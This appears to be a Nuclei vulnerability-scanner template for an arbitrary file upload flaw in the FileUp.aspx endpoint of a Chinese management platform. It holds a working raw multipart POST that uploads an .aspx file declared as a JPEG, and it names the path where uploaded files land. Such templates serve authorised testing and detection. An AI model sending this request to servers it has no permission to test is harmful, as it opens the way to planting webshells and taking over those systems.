id: zhihuizonghe-FileUp-upload
info:
  name: zhihuizonghe-FileUp-upload
  author: apple
  severity: critical
  description: 银达汇智 智慧综合管理平台 Fileup.aspx 存在任意文上传取漏洞。上传后的路径为/imgnews/imgcontent/1/xxxxxxxxxx.aspx
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA%20%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20FileUp.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /Module/FileUpPage/FileUp.aspx?orgid=1&type=NNewsContent HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        Content-Length: 175
        Accept-Language: zh-CN,zh;q=0.8
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: keep-alive
        Cache-Control: max-age=0
        Content-Type: multipart/form-data; boundary=62907949903a4c499178971c9dab4ad9

        --62907949903a4c499178971c9dab4ad9
        Content-Disposition: form-data; name="Filedata"; filename="yyxixi.aspx"
        Content-Type: image/jpeg

        123
        --62907949903a4c499178971c9dab4ad9--
    matchers:
      - type: word
        part: body
        words:
          - 'aspx'
#路径为：/imgnews/imgcontent/1/xxxxxxxxxx.aspx